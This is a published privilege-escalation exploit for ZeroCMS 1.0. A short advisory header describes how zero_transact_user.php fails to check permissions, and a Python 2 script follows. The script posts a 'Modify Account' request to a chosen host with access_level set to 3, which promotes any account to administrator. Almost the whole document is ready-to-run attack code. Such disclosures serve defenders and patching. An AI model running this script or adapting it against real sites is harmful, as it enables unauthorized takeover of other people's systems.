 
# ZeroCMS 1.0
# zero_transact_user.php
# Impropper Form post hanling, (parameter polution)
# Vendor: Another Awesome Stuff
# Product web page: http://www.aas9.in/zerocms/
# author: tiago.alexand@gmail.com
# Tested on: php 5.4.27
# OSVDB ID: 108025
# description
# Summary: ZeroCMS is a very simple Content Management
# System built using PHP and MySQL.
# the script zero_transact_user.php contains a Modify Account case
# where the execution context doen&#039;t have in to consideration the current user&#039;s permitions
# allowing a malcious user to escalate its privileges to admin. 
 
def  exploit(host,email,name,userid):
   access_level = 3 # default for admin
   url = host + &#039;/zero_transact_user.php&#039; #the script handles user related actions
   args = { &#039;user_id&#039;:userid,&#039;email&#039;:email, &#039;name&#039;:name,&#039;access_level&#039;:access_level,&#039;action&#039;:&#039;Modify Account&#039; }
   data = urllib.urlencode(args)
   cj = cookielib.CookieJar()
   opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
   response = opener.open(url,data);
   print response.read()
     
def main(argv):
   host = &#039;&#039;
   email = &#039;&#039;
   accountname = &#039;&#039;
   userid = &#039;&#039;
   try:
      opts, args = getopt.getopt(argv,"hu:m:n:i:")
   except getopt.GetoptError:
      print &#039;zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id&#039;
      sys.exit(2)
   for opt, arg in opts:
      if opt == &#039;-h&#039;:
         print &#039;zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id&#039;
         sys.exit()
      elif opt in ("-u"):
         host = arg
      elif opt in ("-m"):
         email = arg
      elif opt in ("-n"):
         accountname = arg
      elif opt in ("-i"):
         userid = arg
   exploit(host,email,accountname,userid)
 
if __name__ == "__main__":
   main(sys.argv[1:])

